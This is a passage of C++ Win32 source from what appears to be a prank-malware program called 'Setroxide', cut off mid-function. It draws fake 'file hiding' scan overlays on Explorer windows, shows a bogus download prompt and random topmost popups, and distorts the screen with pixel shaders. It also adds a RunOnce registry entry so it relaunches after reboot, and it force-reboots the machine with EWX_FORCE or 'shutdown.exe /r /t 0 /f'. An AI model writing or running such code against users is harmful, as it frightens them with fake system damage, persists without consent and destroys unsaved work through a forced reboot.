static bool IsFileExplorerWindow(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd) || !IsWindowVisible(hwnd) || hwnd == g_hBsodWnd) {
        return false;
    }
    char clsName[128] = { 0 };
    GetClassNameA(hwnd, clsName, sizeof(clsName));
    std::string clsLower = ToLowerAscii(clsName);
    return (clsLower == "cabinetwclass" || clsLower == "explorewclass");
}

static std::string ManglePathVisual(const std::string& baseTitle, int idx, int step) {
    static const char kJunk[] = "X#@!?/\\*~$%0123456789ABCDEF";
    const int junkLen = (int)(sizeof(kJunk) - 1);

    std::string p = baseTitle.empty() ? "C:\\Folder\\Item" : ("C:\\" + baseTitle + "\\Item");
    for (size_t i = 0; i < p.size(); ++i) {
        if (p[i] == '\\' || p[i] == '/') {
            p[i] = ((i + (size_t)step) % 2u == 0u) ? '/' : '\\';
        } else if (((i + (size_t)idx + (size_t)step) % 5u) == 0u) {
            p[i] = kJunk[((size_t)(idx * 7 + step * 13) + i) % (size_t)junkLen];
        }
    }

    char tail[48] = { 0 };
    std::snprintf(
        tail, sizeof(tail), "\\%c%c%c_%02X.%c%c%c",
        kJunk[(idx + step) % junkLen],
        kJunk[(idx * 3 + step) % junkLen],
        kJunk[(idx * 5 + step) % junkLen],
        (unsigned int)((idx * 31 + step * 17) & 0xFF),
        kJunk[(step + 2) % junkLen],
        kJunk[(step + 7) % junkLen],
        kJunk[(step + 11) % junkLen]
    );
    return p + tail;
}

static void DrawFakeExplorerOverlayOnWindow(HWND hwnd, int hideStep) {
    RECT wrc = { 0 };
    if (!GetWindowRect(hwnd, &wrc)) return;
    int ww = wrc.right - wrc.left;
    int wh = wrc.bottom - wrc.top;
    if (ww < 120 || wh < 120) return;

    char winTitle[256] = { 0 };
    GetWindowTextA(hwnd, winTitle, sizeof(winTitle));

    HDC hdc = GetWindowDC(hwnd);
    if (!hdc) return;

    int topPad = 78;
    int botPad = 28;
    int bodyTop = topPad;
    int bodyBot = std::max(bodyTop + 24, wh - botPad);
    int rowH = 22;
    int maxRows = std::max(1, (bodyBot - bodyTop) / rowH);
    int hiddenCount = (hideStep % (maxRows + 4));
    if (hiddenCount > maxRows) hiddenCount = maxRows;

    HBRUSH maskBrush = CreateSolidBrush(RGB(255, 255, 255));
    HBRUSH scanBrush = CreateSolidBrush(RGB(24, 24, 38));
    HPEN gridPen = CreatePen(PS_DOT, 1, RGB(210, 210, 220));
    HGDIOBJ oldPen = SelectObject(hdc, gridPen);

    SetBkMode(hdc, TRANSPARENT);
    HFONT hFont = CreateFontA(
        14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, FIXED_PITCH | FF_MODERN, "Lucida Console"
    );
    HGDIOBJ oldFont = SelectObject(hdc, hFont);

    for (int r = 0; r < maxRows; ++r) {
        int ry = bodyTop + r * rowH;
        RECT rowRect = { 14, ry, ww - 14, ry + rowH };

        if (r < hiddenCount) {
            FillRect(hdc, &rowRect, maskBrush);
            MoveToEx(hdc, 18, ry + rowH / 2, nullptr);
            LineTo(hdc, ww - 22, ry + rowH / 2);
        } else {
            std::string mangled = ManglePathVisual(winTitle, r, hideStep);
            SetTextColor(hdc, RGB(140, 20, 60));
            DrawTextA(hdc, mangled.c_str(), -1, &rowRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE | DT_NOPREFIX);
        }
    }

    RECT barRect = { 8, std::max(8, wh - botPad - 22), ww - 8, std::max(30, wh - 6) };
    FillRect(hdc, &barRect, scanBrush);
    SetTextColor(hdc, RGB(120, 255, 160));
    std::string curMangled = ManglePathVisual(winTitle, hiddenCount, hideStep);
    char statusLine[512] = { 0 };
    std::snprintf(
        statusLine, sizeof(statusLine),
        " [SCAN] Hidden: %d/%d | %s",
        hiddenCount, maxRows, curMangled.c_str()
    );
    DrawTextA(hdc, statusLine, -1, &barRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE | DT_NOPREFIX);

    SelectObject(hdc, oldFont);
    DeleteObject(hFont);
    SelectObject(hdc, oldPen);
    DeleteObject(gridPen);
    DeleteObject(scanBrush);
    DeleteObject(maskBrush);
    ReleaseDC(hwnd, hdc);
}

static BOOL CALLBACK EnumExplorerFakeScanProc(HWND hwnd, LPARAM lParam) {
    int hideStep = (int)lParam;
    if (IsFileExplorerWindow(hwnd)) {
        DrawFakeExplorerOverlayOnWindow(hwnd, hideStep);
    }
    return TRUE;
}

static BOOL CALLBACK EnumExplorerRedrawCleanupProc(HWND hwnd, LPARAM lParam) {
    (void)lParam;
    if (IsFileExplorerWindow(hwnd)) {
        RedrawWindow(hwnd, nullptr, nullptr, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN | RDW_UPDATENOW);
    }
    return TRUE;
}

static DWORD WINAPI ExplorerFakeScanHideThread(LPVOID lpParam) {
    (void)lpParam;
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    int step = 0;
    while (g_audioRunning && !g_finalSequenceStarted) {
        g_explorerHideStep = step;
        EnumWindows(EnumExplorerFakeScanProc, (LPARAM)step);
        ++step;
        InterruptibleSleep(180);
    }
    EnumWindows(EnumExplorerRedrawCleanupProc, 0);
    return 0;
}

// --- Post-Reboot "RunOnce" Gotcha MessageBox ---

static void RegisterPostRebootGotchaRunOnce() {
    char exePath[MAX_PATH] = { 0 };
    if (GetModuleFileNameA(nullptr, exePath, MAX_PATH) == 0) return;

    char cmd[MAX_PATH * 2] = { 0 };
    std::snprintf(cmd, sizeof(cmd), "\"%s\" %s", exePath, kGotchaArg);

    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, kRunOnceValueName, 0, REG_SZ, (const BYTE*)cmd, (DWORD)(std::strlen(cmd) + 1));
        RegCloseKey(hKey);
    }
}

static void ClearPostRebootGotchaRunOnce() {
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, kRunOnceValueName);
        RegCloseKey(hKey);
    }
}

static bool HasGotchaLaunchArg(LPCSTR lpCmdLine) {
    if (!lpCmdLine || !*lpCmdLine) return false;
    return (std::strstr(lpCmdLine, kGotchaArg) != nullptr);
}

static void EnableRebootPrivilegeIfNeeded() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return;
    }
    TOKEN_PRIVILEGES tp = { 0 };
    if (LookupPrivilegeValueA(nullptr, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
    }
    CloseHandle(hToken);
}

static void TriggerSystemRebootNow() {
    EnableRebootPrivilegeIfNeeded();
    if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION | SHTDN_REASON_MINOR_OTHER)) {
        STARTUPINFOA si = { 0 };
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = { 0 };
        char cmd[] = "shutdown.exe /r /t 0 /f";
        if (CreateProcessA(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

// --- Bytebeat Evaluators ---

static unsigned char EvalIntroBsodBytebeat(double t) {
    if (t < 480000.0) {
        long long ti = (long long)t;
        int shift = (int)(1 - (ti & 1));
        long long p1 = ti >> shift;
        long long p2 = (~((ti >> 1) & 255)) & (ti & 255);
        long long p3 = ti >> 3;
        return (unsigned char)((p1 | p2 | p3) & 255);
    } else if (t < 840000.0) {
        double rem = 840000.0 - t;
        std::int32_t logFloor = (std::int32_t)BytebeatLog2(rem);
        double p2 = std::pow(2.0, (double)logFloor);
        double norm = rem / p2;

        double poly = (((norm * 0.10969 - 0.729104) * norm + 2.11263) * norm - 1.49278)
                    + (256.0 + (double)logFloor) * 0.6931472;

        std::int64_t b = ((long long)poly) & 255;
        std::int32_t sb = SignExtend8(b);
        std::int32_t st = SignExtend8((long long)(t - 840000.0));

        std::int32_t cVal = (std::int32_t)(std::cos((t - 840000.0) / 666.667) * 127.5 + 127.5);
        std::int32_t sVal = (std::int32_t)(std::sin((t - 840000.0) / 400.0) * 127.5 + 127.5);

        long long expr = (((long long)sb * (long long)st) & (long long)cVal) ^ (long long)sVal;
        return (unsigned char)(expr & 255);
    } else {
        double r = (double)std::rand() / ((double)RAND_MAX + 1.0);
        return (unsigned char)(((long long)(r * 255.0)) & 255);
    }
}

static int GetTrackSampleRate(int trackIdx) {
    static const int kRates[kNumTracks] = {
        12000, 4000, 48000, 8000, 24000, 12000, 8000,
        48000, 48000, 8000, 48000, 24000, 12000, 8000
    };
    return kRates[trackIdx % kNumTracks];
}

static unsigned char EvalRandomTrack(int trackIdx, double t) {
    std::int64_t ti = (std::int64_t)t;
    std::uint32_t tu = (std::uint32_t)ti;

    switch (trackIdx) {
        case 0: {
            std::int64_t a = (std::int64_t)((tu >> 5) ^ tu);
            std::int64_t mask = (tu >> 8) & 0xFFu & (tu >> 9) & ((ti % 11) ? 40u : 60u);
            std::int64_t val = a + ti * (1 - mask);
            return (unsigned char)(val & 255);
        }
        case 1: {
            std::int64_t left = (std::int64_t)(tu >> 6) + 2;
            std::int64_t k = (std::int64_t)((((tu >> 9) - 1u) ^ ((tu ^ 0x1800u) >> 11)) % 13u);
            std::int64_t right = (ti * k) & 0x2F;
            return (unsigned char)((left * right) & 255);
        }
        case 2: {
            std::int64_t p1 = ti & (std::int64_t)(tu >> 3);
            std::int64_t p2 = (std::int64_t)((tu >> 6) ^ ((tu >> 9) + (tu | (tu >> 12))));
            return (unsigned char)((p1 | p2) & 255);
        }
        case 3: {
            std::int64_t left = ti * 4 * ti + (ti & (ti % 500));
            std::int64_t right = (ti & (std::int64_t)(tu >> 13)) *
                                  (std::int64_t)((tu >> 4) | ((tu >> 8) & 0xFFu));
            return (unsigned char)((left & right) & 255);
        }
        case 4: {
            std::int64_t val = (ti & (std::int64_t)(tu >> 12)) *
                               (std::int64_t)((tu >> 4) | ((tu >> 8) & 0xFFu));
            return (unsigned char)(val & 255);
        }
        case 5: {
            int s6 = (int)(ti % 6);
            if (s6 < 0) s6 += 6;
            std::uint32_t val = (tu >> 2) | ((tu >> 4) * ((tu >> 8) & 0xFFu)) | (tu >> s6);
            return (unsigned char)(val & 255);
        }
        case 6: {
            int s1 = (int)((tu >> 15) & 31u);
            int s2 = (int)(((tu >> 15) + 5u) & 31u);
            std::uint32_t rhs = (tu >> s1) | (tu >> s2);
            return (unsigned char)((ti * (std::int64_t)rhs) & 255);
        }
        case 7: {
            int s1 = (int)((tu >> 18) & 31u);
            int s2 = (int)(((tu >> 17) + 5u) & 31u);
            std::uint32_t rhs = (tu >> s1) | (tu >> s2);
            return (unsigned char)((ti * (std::int64_t)rhs) & 255);
        }
        case 8: {
            std::int64_t val = (ti & (std::int64_t)(tu >> 13)) *
                               (std::int64_t)((tu >> 5) | (tu >> 9));
            return (unsigned char)(val & 255);
        }
        case 9: {
            std::int64_t left = (std::int64_t)((tu >> 1) * ((tu >> 8) & 0x2Au));
            std::int64_t right = (ti + 10) ^ (ti * (std::int64_t)((tu >> 9) & 0x2Cu));
            return (unsigned char)((left | right) & 255);
        }
        case 10: {
            std::uint32_t negTu = (std::uint32_t)(-ti);
            std::int32_t div10 = I32(t / 10.0);
            int sh = div10 % 20;
            if (sh < 0) sh += 20;
            std::uint32_t partA = negTu >> sh;

            std::int32_t div13 = I32(t / 13.0);
            std::uint32_t u13 = (std::uint32_t)div13;
            std::uint32_t numTerm = (tu ^ (u13 >> 1)) >> 11;
            double denom = (double)((((tu >> 10) & 255u) & ((tu >> 14) & 255u) & 0xDu) + 18u);
            double divShift = (double)((tu >> 16) + 1u);
            double partB = ((double)numTerm * ((t * t) / divShift)) / denom;

            std::uint32_t combined = partA | U32(partB);
            return (unsigned char)(I32((double)combined) & 255);
        }
        case 11: {
            std::int64_t a = (ti >> 6) ^ (ti & (ti >> 9)) ^ (ti >> 12);
            int sh4 = (int)((ti >> 6) % 4);
            if (sh4 < 0) sh4 += 4;
            std::int64_t b = ((ti << sh4) ^ ((-ti) & ((-ti) >> 13))) % 128;
            if (b < 0) b += 128;
            std::int64_t c = (-ti) >> 1;
            return (unsigned char)((a | b ^ c) & 255);
        }
        case 12: {
            std::uint32_t m1 = ((tu >> 14) & 3u) + 5u;
            std::uint32_t m2 = (((tu ^ 0x400u) >> 10) & 5u) + 3u;
            int shRight = (int)((tu >> 8) & 3u);
            std::uint32_t left = (tu * m1 * m2) >> shRight;

            std::int32_t div12k = I32(t / 12000.0);
            int shXor = (int)(((tu & (std::uint32_t)div12k) & 7u) + 4u);
            std::uint32_t right = tu >> shXor;

            return (unsigned char)((left ^ right) & 255u);
        }
        case 13:
        default: {
            double tMod1000 = std::fmod(t, 1000.0);
            if (tMod1000 < 0.0) tMod1000 += 1000.0;
            double floorArg = tMod1000 * 2.0 * ((double)I32(t) / 24000.0);
            std::int64_t fl = (std::int64_t)std::floor(floorArg);
            std::int64_t left = (fl & 1ll) ? 0ll : 126ll;

            std::int64_t right = ti * (std::int64_t)(((tu >> 8) | ((tu >> 11) & 0x4Bu)) & 0x81u);
            return (unsigned char)((left | right) & 255);
        }
    }
}

// --- Async Download MsgBox & Mini Window Helpers ---

static DWORD WINAPI DownloadMsgBoxThread(LPVOID lpParam) {
    (void)lpParam;
    if (g_finalSequenceStarted) return 0;
    UINT flags = MB_ICONQUESTION | MB_YESNO;
    if (g_osInfo.era >= OS_ERA_WIN2K) {
        flags |= MB_SYSTEMMODAL;
    }
    MessageBoxA(
        nullptr,
        "Do you want to download this file?\nSETROXIDE-GENERATED-G6NHUNHZ4NGE.exe",
        "File Download",
        flags
    );
    return 0;
}

static void TriggerDownloadPrompt() {
    if (g_finalSequenceStarted) return;
    HANDLE h = CreateThread(nullptr, 0, DownloadMsgBoxThread, nullptr, 0, nullptr);
    if (h) CloseHandle(h);
}

static LRESULT CALLBACK MiniPopWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rc;
            GetClientRect(hwnd, &rc);
            HBRUSH br = CreateSolidBrush(RGB(std::rand() & 255, std::rand() & 255, std::rand() & 255));
            FillRect(hdc, &rc, br);
            DeleteObject(br);
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(255, 255, 255));
            DrawTextA(hdc, "SETROXIDE", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            EndPaint(hwnd, &ps);
            return 0;
        }
        case WM_TIMER:
            DestroyWindow(hwnd);
            return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

static DWORD WINAPI MiniPopWindowThread(LPVOID lpParam) {
    if (g_finalSequenceStarted) return 0;
    int x = (int)(((std::intptr_t)lpParam) >> 16);
    int y = (int)(((std::intptr_t)lpParam) & 0xFFFF);

    static bool regDone = false;
    if (!regDone) {
        WNDCLASSEXA wcex = { 0 };
        wcex.cbSize = sizeof(WNDCLASSEXA);
        wcex.lpfnWndProc = MiniPopWndProc;
        wcex.hInstance = GetModuleHandleA(nullptr);
        wcex.lpszClassName = kMiniWinClass;
        RegisterClassExA(&wcex);
        regDone = true;
    }

    int w = 140 + (std::rand() % 180);
    int h = 90 + (std::rand() % 120);
    DWORD exStyle = WS_EX_TOPMOST | WS_EX_TOOLWINDOW;
    bool useLayered = (g_osInfo.era >= OS_ERA_WIN2K && g_pfnUpdateLayeredWindow != nullptr);
    if (useLayered) {
        exStyle |= WS_EX_LAYERED;
    }

    HWND mw = CreateWindowExA(
        exStyle,
        kMiniWinClass,
        "Setroxide",
        WS_POPUP | WS_BORDER | WS_VISIBLE,
        x, y, w, h,
        nullptr, nullptr, GetModuleHandleA(nullptr), nullptr
    );
    if (!mw) return 0;

    if (useLayered) {
        HDC scr = GetDC(nullptr);
        POINT ptSrc = { 0, 0 };
        POINT ptDst = { x, y };
        SIZE sz = { w, h };
        BLENDFUNCTION bf = { AC_SRC_OVER, 0, 225, 0 };
        g_pfnUpdateLayeredWindow(mw, scr, &ptDst, &sz, scr, &ptSrc, 0, &bf, ULW_ALPHA);
        ReleaseDC(nullptr, scr);
    }

    SetWindowPos(mw, HWND_TOPMOST, x, y, w, h, SWP_SHOWWINDOW);
    RedrawWindow(mw, nullptr, nullptr, RDW_INVALIDATE | RDW_UPDATENOW);

    SetTimer(mw, 77, 650, nullptr);
    MSG m;
    while (!g_finalSequenceStarted && (PeekMessageA(&m, nullptr, 0, 0, PM_REMOVE) || GetMessageA(&m, nullptr, 0, 0) > 0)) {
        if (m.message == WM_QUIT) break;
        TranslateMessage(&m);
        DispatchMessageA(&m);
        if (!IsWindow(mw)) break;
    }
    if (IsWindow(mw)) DestroyWindow(mw);
    return 0;
}

static void TriggerRandomPopupWindow(int sw, int sh) {
    if (g_finalSequenceStarted) return;
    int x = std::rand() % std::max(1, sw - 200);
    int y = std::rand() % std::max(1, sh - 140);
    std::intptr_t packed = ((std::intptr_t)(x & 0xFFFF) << 16) | (std::intptr_t)(y & 0xFFFF);
    HANDLE h = CreateThread(nullptr, 0, MiniPopWindowThread, (LPVOID)packed, 0, nullptr);
    if (h) CloseHandle(h);
}

// --- 38 Pixel Shaders Engine ---

static std::uint32_t ShadePixel(int shaderIdx, int x, int y, int sw, int sh, int step, std::uint32_t src) {
    int sr = (int)((src >> 16) & 0xFF);
    int sg = (int)((src >> 8) & 0xFF);
    int sb = (int)(src & 0xFF);
    double fx = (double)x / (double)std::max(1, sw);
    double fy = (double)y / (double)std::max(1, sh);
    double cx = fx - 0.5;
    double cy = fy - 0.5;
    double t = (double)step * 0.14;

    int r = sr, g = sg, b = sb;

    switch (shaderIdx) {
        case FX_SHD_00_PLASMA: {
            double v = std::sin(fx * 12.0 + t) + std::cos(fy * 10.0 - t * 1.3) + std::sin((fx + fy) * 8.0 + t * 0.7);
            int p = (int)((v + 3.0) * 42.0);
            r = ClampByte((sr + p) ^ (step & 31));
            g = ClampByte((sg + (p >> 1)) ^ ((step * 3) & 31));
            b = ClampByte((sb + (255 - (p & 255))) ^ ((step * 7) & 31));
            break;
        }
        case FX_SHD_01_TUNNEL: {
            double dist = std::sqrt(cx * cx + cy * cy) + 0.04;
            double ang = std::atan2(cy, cx);
            int u = (int)(18.0 / dist + t * 24.0) & 255;
            int v = (int)((ang + 3.14159265) * 40.0 + t * 12.0) & 255;
            r = ClampByte(sr ^ u);
            g = ClampByte(sg ^ v);
            b = ClampByte(sb ^ ((u + v) >> 1));
            break;
        }
        case FX_SHD_02_XOR_MATRIX: {
            int xv = ((x + step * 7) >> 2) ^ ((y + step * 5) >> 2);
            r = ClampByte(sr ^ (xv & 255));
            g = ClampByte(sg ^ ((xv * 3) & 255));
            b = ClampByte(sb ^ ((xv * 5) & 255));
            break;
        }
        case FX_SHD_03_RGB_SPLIT_X: {
            int shf = 8 + ((step * 5) % 24);
            int sxR = (x + shf) % std::max(1, sw);
            int sxB = (x - shf + sw) % std::max(1, sw);
            r = ClampByte(sr + ((sxR ^ y) & 63) - 24);
            g = ClampByte(sg);
            b = ClampByte(sb + ((sxB ^ y) & 63) - 24);
            break;
        }
        case FX_SHD_04_RGB_SPLIT_Y: {
            int wave = (int)(std::sin(fx * 16.0 + t) * 48.0);
            r = ClampByte(sr + wave);
            g = ClampByte(sg - (wave >> 1));
            b = ClampByte(sb - wave);
            break;
        }
        case FX_SHD_05_HUE_CYCLE: {
            int shift = (step * 19) & 255;
            r = ClampByte((sr + shift) & 255);
            g = ClampByte((sg + ((shift * 2) & 255)) & 255);
            b = ClampByte((sb + ((shift * 3) & 255)) & 255);
            break;
        }
        case FX_SHD_06_SCANLINE_ROLL: {
            int roll = ((y + step * 11) % 16) < 4 ? 48 : -20;
            r = ClampByte(sr + roll);
            g = ClampByte(sg + roll);
            b = ClampByte(sb + roll);
            break;
        }
        case FX_SHD_07_CRT_NOISE: {
            unsigned int n = (unsigned int)(x * 374761393u + y * 668265263u + (unsigned int)step * 2246822519u);
            n = (n ^ (n >> 13)) * 1274126177u;
            int d = (int)((n >> 24) & 63u) - 31;
            int scan = ((y & 1) == 0) ? 10 : -26;
            r = ClampByte(sr + d + scan);
            g = ClampByte(sg + d + scan);
            b = ClampByte(sb + d + scan);
            break;
        }
        case FX_SHD_08_WAVE_HORIZ: {
            int w = (int)(std::sin(fy * 28.0 + t * 2.0) * 64.0);
            r = ClampByte((sr + w) ^ (w & 31));
            g = ClampByte(sg - (w >> 1));
            b = ClampByte((sb - w) ^ ((w >> 1) & 31));
            break;
        }
        case FX_SHD_09_WAVE_VERT: {
            int w = (int)(std::cos(fx * 24.0 - t * 1.8) * 64.0);
            r = ClampByte(sr - (w >> 1));
            g = ClampByte((sg + w) ^ (w & 31));
            b = ClampByte(sb + (w >> 1));
            break;
        }
        case FX_SHD_10_SWIRL: {
            double rad = std::sqrt(cx * cx + cy * cy);
            double ang = std::atan2(cy, cx) + rad * 7.0 - t * 0.8;
            int s = (int)((std::sin(ang * 4.0) + 1.0) * 90.0);
            r = ClampByte(sr ^ s);
            g = ClampByte(sg ^ (s >> 1));
            b = ClampByte(sb ^ (255 - s));
            break;
        }
        case FX_SHD_11_RIPPLE_RADIAL: {
            double rad = std::sqrt(cx * cx + cy * cy);
            int rp = (int)(std::sin(rad * 42.0 - t * 3.0) * 80.0);
            r = ClampByte(sr + rp);
            g = ClampByte(sg + (rp >> 1));
            b = ClampByte(sb - rp);
            break;
        }
        case FX_SHD_12_MANDEL_ORBIT: {
            double zx = cx * 2.4;
            double zy = cy * 2.4;
            double ox = -0.55 + 0.15 * std::cos(t * 0.4);
            double oy = 0.52 + 0.15 * std::sin(t * 0.4);
            int iter = 0;
            while (iter < 14 && (zx * zx + zy * zy) < 4.0) {
                double nx = zx * zx - zy * zy + ox;
                zy = 2.0 * zx * zy + oy;
                zx = nx;
                ++iter;
            }
            int m = (iter * 23 + step * 7) & 255;
            r = ClampByte(sr ^ m);
            g = ClampByte(sg ^ ((m * 2) & 255));
            b = ClampByte(sb ^ ((m * 4) & 255));
            break;
        }
        case FX_SHD_13_CHECKER_WARP: {
            int cw = 16 + (int)(std::sin(t) * 8.0);
            int ix = (x + (int)(std::sin(fy * 12.0 + t) * 20.0)) / std::max(1, cw);
            int iy = (y + (int)(std::cos(fx * 12.0 - t) * 20.0)) / std::max(1, cw);
            int chk = ((ix ^ iy) & 1) ? 95 : -45;
            r = ClampByte(sr + chk);
            g = ClampByte(sg - (chk >> 1));
            b = ClampByte(sb + chk);
            break;
        }
        case FX_SHD_14_SOLARIZE: {
            int thr = 110 + (int)(std::sin(t * 1.5) * 60.0);
            r = (sr > thr) ? (255 - sr) : sr;
            g = (sg > thr) ? (255 - sg) : sg;
            b = (sb > thr) ? (255 - sb) : sb;
            break;
        }
        case FX_SHD_15_POSTERIZE: {
            int levels = 3 + (step % 4);
            int div = 256 / levels;
            r = ClampByte((sr / div) * div + (div >> 1));
            g = ClampByte((sg / div) * div + (div >> 1));
            b = ClampByte((sb / div) * div + (div >> 1));
            break;
        }
        case FX_SHD_16_BIT_AND_MASK: {
            int mask = 0xE0 | ((step * 17) & 0x1F);
            r = (sr & mask) ^ ((x + step) & 31);
            g = (sg & mask) ^ ((y - step) & 31);
            b = (sb & mask) ^ ((x ^ y ^ step) & 31);
            break;
        }
        case FX_SHD_17_BIT_OR_BOOST: {
            int orv = (step * 13) & 0x3F;
            r = ClampByte((sr | orv) ^ ((y >> 2) & 31));
            g = ClampByte((sg | (orv >> 1)) ^ ((x >> 2) & 31));
            b = ClampByte((sb | (orv << 1)) ^ ((step) & 31));
            break;
        }
        case FX_SHD_18_INVERT_BANDS: {
            int band = (((y + step * 9) / 28) & 1);
            if (band) {
                r = 255 - sr;
                g = 255 - sg;
                b = 255 - sb;
            }
            break;
        }
        case FX_SHD_19_CHROME_BANDS: {
            double v = std::sin(fy * 36.0 + t * 2.4 + std::cos(fx * 10.0 - t));
            int c = (int)(std::fabs(v) * 255.0);
            r = ClampByte((sr + c) >> 1);
            g = ClampByte((sg + (255 - c)) >> 1);
            b = ClampByte((sb + c) >> 1);
            break;
        }
        case FX_SHD_20_KALEIDO_QUAD: {
            double ax = std::fabs(cx);
            double ay = std::fabs(cy);
            int k = (int)((ax * 220.0 + ay * 220.0) + step * 11) & 255;
            r = ClampByte(sr ^ k);
            g = ClampByte(sg ^ ((k + 85) & 255));
            b = ClampByte(sb ^ ((k + 170) & 255));
            break;
        }
        case FX_SHD_21_VIGNETTE_PULSE: {
            double d = std::sqrt(cx * cx + cy * cy) * 1.4;
            double pulse = 0.65 + 0.35 * std::sin(t * 2.2 - d * 6.0);
            r = ClampByte((int)(sr * pulse * 1.25));
            g = ClampByte((int)(sg * pulse * 1.1));
            b = ClampByte((int)(sb * pulse * 1.3));
            break;
        }
        case FX_SHD_22_DIAGONAL_SHEAR: {
            int diag = (x + y + step * 15) & 255;
            r = ClampByte(sr + ((diag & 63) - 31));
            g = ClampByte(sg + (((diag >> 1) & 63) - 31));
            b = ClampByte(sb + (((diag >> 2) & 63) - 31));
            break;
        }
        case FX_SHD_23_BLOCK_SHUFFLE: {
            int bx = (x >> 5) * 32;
            int by = (y >> 5) * 32;
            int hsh = (bx * 73 + by * 139 + step * 29) & 255;
            r = ClampByte(sr ^ hsh);
            g = ClampByte(sg ^ ((hsh * 3) & 255));
            b = ClampByte(sb ^ ((hsh * 5) & 255));
            break;
        }
        case FX_SHD_24_PIXEL_MOSAIC: {
            int m = 8 + (step % 12);
            int px = (x / m) * m;
            int py = (y / m) * m;
            int val = ((px * 13) ^ (py * 29) ^ (step * 17)) & 127;
            r = ClampByte(sr + val - 50);
            g = ClampByte(sg + (127 - val) - 50);
            b = ClampByte(sb + ((val << 1) & 127) - 50);
            break;
        }
        case FX_SHD_25_STATIC_SNOW: {
            unsigned int s = (unsigned int)((x + step * 97) * 1103515245u + (unsigned int)(y + step * 53) * 12345u);
            int sn = (int)((s >> 23) & 255u) - 120;
            r = ClampByte(sr + sn);
            g = ClampByte(sg + sn);
            b = ClampByte(sb + sn);
            break;
        }
        case FX_SHD_26_COLOR_SHIFT_GBR: {
            r = sg;
            g = sb;
            b = sr;
            break;
        }
        case FX_SHD_27_COLOR_SHIFT_BRG: {
            r = sb;
            g = sr;
            b = sg;
            break;
        }
        case FX_SHD_28_MOD_GRID: {
            int gx = (x + step * 5) % 24;
            int gy = (y + step * 7) % 24;
            int edge = (gx < 2 || gy < 2) ? 110 : -15;
            r = ClampByte(sr + edge);
            g = ClampByte(sg + (edge >> 1));
            b = ClampByte(sb - (edge >> 1));
            break;
        }
        case FX_SHD_29_SINE_CROSS: {
            double sx = std::sin(fx * 20.0 + t);
            double sy = std::sin(fy * 20.0 - t);
            int v = (int)((sx * sy + 1.0) * 110.0);
            r = ClampByte(sr ^ v);
            g = ClampByte(sg ^ (255 - v));
            b = ClampByte(sb ^ ((v * 3) & 255));
            break;
        }
        case FX_SHD_30_HYPERSPACE_STREAK: {
            double ang = std::atan2(cy, cx);
            double ray = std::cos(ang * 24.0 + t * 2.0);
            int st = (ray > 0.65) ? 140 : -20;
            r = ClampByte(sr + st);
            g = ClampByte(sg + st);
            b = ClampByte(sb + st);
            break;
        }
        case FX_SHD_31_THERMAL_MAP: {
            int lum = (sr * 3 + sg * 6 + sb) / 10;
            int idx = (lum + step * 11) & 255;
            r = ClampByte(idx < 128 ? idx * 2 : 255);
            g = ClampByte(idx < 64 ? 0 : (idx < 192 ? (idx - 64) * 2 : 255));
            b = ClampByte(idx < 128 ? 255 - idx * 2 : 0);
            break;
        }
        case FX_SHD_32_GLITCH_TEAR: {
            int tear = ((y / 14 + step) % 7 == 0) ? 95 : 0;
            if (tear > 0) {
                r = ClampByte(255 - sr);
                g = ClampByte(sg + 70);
                b = ClampByte(255 - sb);
            }
            break;
        }
        case FX_SHD_33_SPIRAL_TUNNEL: {
            double rad = std::sqrt(cx * cx + cy * cy) + 0.05;
            double ang = std::atan2(cy, cx);
            int sp = (int)((ang * 6.0 + 14.0 / rad - t * 3.0) * 40.0) & 255;
            r = ClampByte(sr ^ sp);
            g = ClampByte(sg ^ ((sp * 2) & 255));
            b = ClampByte(sb ^ ((sp * 5) & 255));
            break;
        }
        case FX_SHD_34_PHASE_COMB: {
            int c1 = (int)(std::sin(fx * 30.0 + t) * 70.0);
            int c2 = (int)(std::cos(fy * 30.0 + t * 1.4) * 70.0);
            r = ClampByte(sr + c1);
            g = ClampByte(sg + c2);
            b = ClampByte(sb - ((c1 + c2) >> 1));
            break;
        }
        case FX_SHD_35_NOISE_DITHER: {
            static const int bayer4[4][4] = {
                {  0,  8,  2, 10 },
                { 12,  4, 14,  6 },
                {  3, 11,  1,  9 },
                { 15,  7, 13,  5 }
            };
            int th = (bayer4[y & 3][x & 3] * 16) - 120;
            r = ClampByte(sr + th);
            g = ClampByte(sg + (th >> 1));
            b = ClampByte(sb - (th >> 1));
            break;
